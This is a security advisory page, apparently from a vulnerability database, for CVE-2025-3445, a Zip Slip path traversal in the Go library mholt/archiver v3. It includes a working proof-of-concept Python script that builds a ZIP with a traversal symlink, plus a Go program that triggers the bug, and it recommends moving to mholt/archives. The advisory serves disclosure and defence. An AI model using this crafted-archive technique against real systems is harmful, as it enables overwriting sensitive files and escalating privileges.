{"hash":"6d43c671db2e1ad5922ca9ca379d639616426ff9","data":{"post":{"title":"mholt/archiver Zip Slip Path Traversal","path":"/vulnerabilities/archiver-zip-slip/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>This vulnerability allows the use of a crafted ZIP file containing path traversal symlinks to create or overwrite files with the privileges of the user or application utilizing the library.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://github.com/mholt/archiver\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/mholt/archiver/v3</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>[3.0.0,3.5.1]</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>A Zip Slip vulnerability has been identified in mholt/archiver in Go. This vulnerability allows the use of a crafted ZIP file containing path traversal symlinks to create or overwrite files with the privileges of the user or application utilizing the library.</p>\n<p>When using the archiver.Unarchive functionality with ZIP files like this:\n<code>archiver.Unarchive(zipFile, outputDir)</code></p>\n<p>A crafted ZIP file can be extracted in such a way that it writes files to the affected system with the same privileges as the application executing this vulnerable functionality. Consequently, sensitive files may be overwritten, potentially leading to privilege escalation, code execution, and other severe outcomes in some cases.</p>\n<p>It is worth noting that a similar vulnerability has been identified in TAR files (CVE-2024-0406), which has yet to be officially fixed.\nAlso, we have observed the 0.1.0 release of the archives package in which the Unarchive() functionality has been removed from various parts of the project. However, the latest stable release that is currently available in the archiver package (v3.5.1) remains affected by this vulnerability.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>An example to create a crafted zip file that has symlinks with path traversal:</p>\n<p>create_zip.py:</p>\n<pre><code>import zipfile\nimport os\nimport io\n\ndef create_zip(zip_path):\n    with zipfile.ZipFile(zip_path, 'w') as zip_ref:\n        symlink_target = '../../../here'\n        symlink_info = zipfile.ZipInfo('./x')\n        symlink_info.external_attr = 0o120777 &#x3C;&#x3C; 16\n        zip_ref.writestr(symlink_info, symlink_target)\n        regular_file_content = b'Exploited!\\n'\n        zip_ref.writestr('./x', regular_file_content)\n\nif __name__ == \"__main__\":\n    zip_path = \"exploit.zip\"\n    create_zip(zip_path)\n    print(f\"Zip file created at {zip_path} with the specific conditions.\")\n</code></pre>\n<p>An example of a vulnerable application that uses the vulnerable <code>archiver.Unarchive()</code> functionality with a provided crafted zip file:</p>\n<p>main.go:</p>\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"github.com/mholt/archiver/v3\"\n)\n\nfunc main() {\n    zipFile := \"exploit.zip\"\n    outputDir := \"output_directory\"\n    err := archiver.Unarchive(zipFile, outputDir)\n    if err != nil {\n        log.Fatalf(\"Failed to unarchive %s: %v\", zipFile, err)\n    }\n    fmt.Printf(\"Successfully extracted %s to %s\\n\", zipFile, outputDir)\n}\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>The <a href=\"https://github.com/mholt/archiver\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/mholt/archiver</a> project is deprecated and replaced by the project <a href=\"https://github.com/mholt/archives\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/mholt/archives</a> which is not affected by this issue.\nIt is recommended to switch to this maintained library if possible.</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/mholt/archives/issues/27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Original advisory</a></p>\n","description":"CVE-2025-3445 High severity. mholt/archiver Zip Slip Path Traversal","date_published":"2025-04-14","xray_id":"","vul_id":"CVE-2025-3445","severity":"high","discovered_by":"Ofri Ouzan","last_updated":"2025-04-14","cvss":8.1}},"context":{}}